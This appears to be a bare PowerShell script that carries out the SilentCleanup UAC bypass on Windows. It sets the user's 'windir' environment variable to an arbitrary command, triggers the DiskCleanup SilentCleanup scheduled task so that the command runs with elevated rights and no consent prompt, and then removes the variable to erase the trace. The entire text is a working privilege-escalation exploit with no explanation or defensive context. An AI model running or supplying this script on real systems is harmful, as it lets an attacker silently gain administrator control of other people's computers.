$command = "powershell -noexit " + $args + ";#";
Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value $command ;
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I;
Remove-ItemProperty -Path "HKCU:\Environment" -Name "windir"
